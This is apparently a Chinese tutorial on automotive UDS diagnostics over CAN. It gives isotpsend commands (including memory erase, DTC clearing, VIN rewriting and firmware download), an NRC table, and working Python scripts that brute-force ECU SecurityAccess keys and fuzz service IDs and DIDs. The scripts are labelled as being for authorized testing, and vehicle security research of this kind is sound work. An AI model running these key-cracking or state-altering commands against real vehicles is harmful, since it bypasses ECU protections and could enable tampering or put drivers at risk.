#### 使用 isotpsend/isotprecv 进行 UDS 通信

```bash
# ============================================================
# 基础 UDS 命令（ISO-TP over CAN）
# 物理寻址：源ID=0x7E0(Tester)，目标ID=0x7E8(ECU)
# 功能寻址：源ID=0x7DF(Broadcast)
# ============================================================

# 1. 切换诊断会话（DiagnosticSessionControl, 0x10）
# 切换到扩展会话 (0x03)
echo "10 03" | isotpsend -s 0x7E0 -d 0x7E8 can0
# 响应示例: 50 03 00 32 01 F4  (0x50=正响应, 0032=P2Server_max)

# 切换到编程会话 (0x02)
echo "10 02" | isotpsend -s 0x7E0 -d 0x7E8 can0

# 返回默认会话 (0x01)
echo "10 01" | isotpsend -s 0x7E0 -d 0x7E8 can0

# 2. ECU重置（ECUReset, 0x11）
# 硬重置 (0x01)
echo "11 01" | isotpsend -s 0x7E0 -d 0x7E8 can0
# 软重置 (0x03)
echo "11 03" | isotpsend -s 0x7E0 -d 0x7E8 can0

# 3. 读取数据（ReadDataByIdentifier, 0x22）
# 读取VIN码 (DID=0xF190)
echo "22 F1 90" | isotpsend -s 0x7E0 -d 0x7E8 can0
# 读取ECU硬件版本 (DID=0xF184)
echo "22 F1 84" | isotpsend -s 0x7E0 -d 0x7E8 can0
# 读取软件版本 (DID=0xF188)
echo "22 F1 88" | isotpsend -s 0x7E0 -d 0x7E8 can0
# 批量读取多个DID
echo "22 F1 90 F1 84 F1 88" | isotpsend -s 0x7E0 -d 0x7E8 can0

# 4. 写入数据（WriteDataByIdentifier, 0x2E）
# 写入VIN码
echo "2E F1 90 31 48 34 47 42 31 32 33 34 35 36 37 38 39 30 31 32" | isotpsend -s 0x7E0 -d 0x7E8 can0

# 5. 安全访问（SecurityAccess, 0x27）
# 请求种子（安全等级1，RequestSeed=0x01）
echo "27 01" | isotpsend -s 0x7E0 -d 0x7E8 can0
# 响应示例: 67 01 12 34 56 78  (12 34 56 78 = 种子)

# 发送密钥（SendKey=0x02，需根据种子计算）
echo "27 02 AA BB CC DD" | isotpsend -s 0x7E0 -d 0x7E8 can0
# 成功响应: 67 02
# 失败响应: 7F 27 35  (NRC=0x35 无效密钥)

# 6. 例程控制（RoutineControl, 0x31）
# 启动例程（擦除内存，Routine ID=0xFF00）
echo "31 01 FF 00" | isotpsend -s 0x7E0 -d 0x7E8 can0
# 查询例程状态
echo "31 03 FF 00" | isotpsend -s 0x7E0 -d 0x7E8 can0
# 停止例程
echo "31 02 FF 00" | isotpsend -s 0x7E0 -d 0x7E8 can0

# 7. 固件下载（RequestDownload, 0x34）
# 请求下载（地址=0x100000，大小=0x010000）
echo "34 00 44 01 00 10 00 00 01 00 00" | isotpsend -s 0x7E0 -d 0x7E8 can0
# 响应示例: 74 20 00 01 00  (maxNumberOfBlockLength=0x10000)

# 8. 传输数据（TransferData, 0x36）
# 数据块1
echo "36 01 00 01 02 03 04 05 ..." | isotpsend -s 0x7E0 -d 0x7E8 can0

# 9. 结束传输（RequestTransferExit, 0x37）
echo "37" | isotpsend -s 0x7E0 -d 0x7E8 can0

# 10. 保活（TesterPresent, 0x3E）
# 保持诊断会话不超时
echo "3E 00" | isotpsend -s 0x7E0 -d 0x7E8 can0

# 11. 读取DTC（ReadDTCInformation, 0x19）
# 读取所有DTC (0x02, statusMask=0x08=确认故障)
echo "19 02 08" | isotpsend -s 0x7E0 -d 0x7E8 can0
# 读取DTC快照
echo "19 04 00 P1122 01" | isotpsend -s 0x7E0 -d 0x7E8 can0
# 读取DTC扩展数据
echo "19 06 00 P1122 FF" | isotpsend -s 0x7E0 -d 0x7E8 can0

# 12. 清除DTC（ClearDiagnosticInformation, 0x14）
# 清除所有DTC (groupOfDTC=0xFFFFFF)
echo "14 FF FF FF" | isotpsend -s 0x7E0 -d 0x7E8 can0

# 13. 控制DTC设置（ControlDTCSetting, 0x85）
# 关闭DTC记录 (0x02=Off)
echo "85 02" | isotpsend -s 0x7E0 -d 0x7E8 can0
# 开启DTC记录 (0x01=On)
echo "85 01" | isotpsend -s 0x7E0 -d 0x7E8 can0

# 14. 输入输出控制（InputOutputControlByIdentifier, 0x2F）
# 控制车灯（IO-Control: 0x03=ShortTermAdjustment）
echo "2F 01 23 03 01" | isotpsend -s 0x7E0 -d 0x7E8 can0
```

#### UDS 负响应码（NRC）速查

```
NRC值 | 名称                     | 说明
------|--------------------------|----------------------------------
0x10  | General Reject           | 通用拒绝
0x11  | Service Not Supported    | 服务不支持
0x12  | Sub-Function Not Supported | 子功能不支持
0x13  | Incorrect Message Length | 消息长度错误
0x21  | Busy Repeat Request      | 忙，请重复请求
0x22  | Conditions Not Correct   | 条件不满足
0x24  | Request Sequence Error   | 请求顺序错误
0x31  | Request Out Of Range     | 请求超出范围
0x33  | Security Access Denied   | 安全访问被拒绝（未解锁）
0x35  | Invalid Key              | 密钥无效
0x36  | Exceeded Attempts        | 尝试次数超限
0x37  | Required Time Delay Not Expired | 需等待延时
0x70  | Upload/Download Not Accepted | 上传/下载不被接受
0x71  | Transfer Data Suspended  | 传输数据暂停
0x72  | General Programming Failure | 通用编程失败
0x73  | Wrong Block Sequence Counter | 块序列计数器错误
0x78  | Response Pending         | 响应待处理（稍后再查）
0x7E  | Sub-Function Not Supported In Active Session | 当前会话不支持
0x7F  | Service Not Supported In Active Session | 当前会话不支持此服务
```

### UDS 安全访问破解实战

```python
"""
UDS SecurityAccess 安全访问破解思路
⚠️ 仅供授权安全测试使用
"""

import can
import isotp
import struct
import time

class UDSSecurityCracker:
    def __init__(self, can_interface='can0', tx_id=0x7E0, rx_id=0x7E8):
        self.bus = can.interface.Bus(channel=can_interface, bustype='socketcan')
        self.addr = isotp.Address(isotp.AddressingMode.Normal_11bits, txid=tx_id, rxid=rx_id)
        self.stack = isotp.NotifierBasedCanStack(self.bus, self.addr)
        self.conn = isotp.AsynchronousStackTransport(self.stack)

    def request_seed(self, level=0x01):
        """请求安全访问种子"""
        req = bytes([0x27, level])
        self.conn.send(req)
        resp = self.conn.recv(timeout=5)
        if resp and resp[0] == 0x67:  # 正响应
            return resp[2:]  # 返回种子数据
        return None

    def send_key(self, level=0x02, key=b''):
        """发送密钥，返回是否成功"""
        req = bytes([0x27, level]) + key
        self.conn.send(req)
        resp = self.conn.recv(timeout=5)
        if resp and resp[0] == 0x67:
            return True
        return False

    def brute_force_4byte_key(self, seed, max_attempts=100000):
        """暴力破解4字节密钥（仅用于演示弱密钥情况）"""
        # 常见弱密钥模式：全0、全1、种子本身、种子XOR常量、CRC等
        patterns = [
            b'\x00\x00\x00\x00',
            b'\xFF\xFF\xFF\xFF',
            b'\x11\x22\x33\x44',
            b'\xAA\xBB\xCC\xDD',
            seed,  # 密钥=种子
            bytes([~b & 0xFF for b in seed]),  # 种子取反
        ]
        
        for key in patterns:
            # 每次尝试前需要重新请求种子（ECU可能每次种子不同）
            new_seed = self.request_seed(0x01)
            if new_seed is None:
                print("[-] 获取种子失败")
                break
                
            if self.send_key(0x02, key):
                print(f"[+] 密钥破解成功: {key.hex()}")
                return key
        
        # 枚举前N个可能值（4字节全枚举不现实）
        for i in range(min(max_attempts, 0x10000)):
            key = struct.pack('>I', i)
            new_seed = self.request_seed(0x01)
            if new_seed and self.send_key(0x02, key):
                print(f"[+] 密钥破解成功: {key.hex()}")
                return key
            if i % 1000 == 0:
                print(f"[*] 已尝试 {i} 个密钥...")
        
        return None

    def close(self):
        self.conn.close()
        self.bus.shutdown()

# 使用示例
if __name__ == '__main__':
    cracker = UDSSecurityCracker('vcan0', 0x7E0, 0x7E8)
    
    # 先切换到扩展会话
    # ... (需要先通过 0x10 03 切换会话)
    
    seed = cracker.request_seed(0x01)
    if seed:
        print(f"种子: {seed.hex()}")
        cracker.brute_force_4byte_key(seed)
    
    cracker.close()
```

### UDS 模糊测试方法

```python
"""
UDS 模糊测试脚本框架
⚠️ 仅供授权安全测试使用，模糊测试可能导致ECU异常
"""

import can
import isotp
import random
import time

class UDSFuzzer:
    def __init__(self, interface='can0', tx_id=0x7E0, rx_id=0x7E8):
        self.bus = can.interface.Bus(channel=interface, bustype='socketcan')
        self.addr = isotp.Address(isotp.AddressingMode.Normal_11bits, txid=tx_id, rxid=rx_id)
        self.stack = isotp.NotifierBasedCanStack(self.bus, self.addr)
        self.conn = isotp.AsynchronousStackTransport(self.stack)
        self.crash_log = []

    def send_uds(self, data, timeout=2):
        """发送UDS请求并返回响应"""
        try:
            self.conn.send(data)
            resp = self.conn.recv(timeout=timeout)
            return resp
        except:
            return None

    def fuzz_service_id(self):
        """模糊测试服务ID（SID）"""
        print("[*] 开始 SID 模糊测试...")
        for sid in range(0x00, 0x100):
            # 跳过已知会导致严重问题的服务
            if sid in [0x11, 0x34, 0x36, 0x37]:  # 跳过重置、刷写
                continue
                
            req = bytes([sid]) + bytes([random.randint(0, 255) for _ in range(4)])
            resp = self.send_uds(req, timeout=1)
            
            if resp is None:
                print(f"[!] SID=0x{sid:02X} 无响应（可能ECU挂了）")
                self.crash_log.append(('sid', sid, req.hex()))
                # 尝试重新连接
                time.sleep(2)
            elif resp[0] == 0x7F:
                nrc = resp[3]
                if nrc != 0x12:  # 非"子功能不支持"
                    print(f"[*] SID=0x{sid:02X} NRC=0x{nrc:02X} (有趣响应)")
            else:
                print(f"[+] SID=0x{sid:02X} 正响应! 响应: {resp.hex()}")
                self.crash_log.append(('positive_sid', sid, resp.hex()))

    def fuzz_did(self, sid=0x22):
        """模糊测试数据标识符（DID）"""
        print(f"[*] 开始 DID 模糊测试（SID=0x{sid:02X}）...")
        found_dids = []
        
        for did in range(0x0000, 0x10000):
            req = bytes([sid, (did >> 8) & 0xFF, did & 0xFF])
            resp = self.send_uds(req, timeout=0.5)
            
            if resp and resp[0] != 0x7F:
                found_dids.append(did)
                print(f"[+] 发现有效DID: 0x{did:04X}, 响应长度: {len(resp)}")
            
            # 每100个输出一次进度
            if did % 0x1000 == 0:
                print(f"[*] 进度: 0x{did:04X}/0xFFFF, 已发现 {len(found_dids)} 个DID")
        
        print(f"[*] DID模糊测试完成，共发现 {len(found_dids)} 个有效DID")
        return found_dids

    def fuzz_security_key(self, seed_length=4):
        """安全访问模糊测试（尝试常见密钥）"""
        print("[*] 开始安全访问模糊测试...")
        
        # 常见密钥模式
        common_keys = [
            bytes([0]*seed_length),
            bytes([0xFF]*seed_length),
            bytes([0x11, 0x22, 0x33, 0x44][:seed_length]),
            bytes([0xDE, 0xAD, 0xBE, 0xEF][:seed_length]),
        ]
        
        for key in common_keys:
            # 请求种子
            seed_resp = self.send_uds(b'\x27\x01')
            if not seed_resp or seed_resp[0] != 0x67:
                continue
            
            # 发送密钥
            key_resp = self.send_uds(b'\x27\x02' + key)
            if key_resp and key_resp[0] == 0x67:
                print(f"[+] 发现有效密钥: {key.hex()}")
                return key
        
        return None

    def close(self):
        self.conn.close()
        self.bus.shutdown()
```
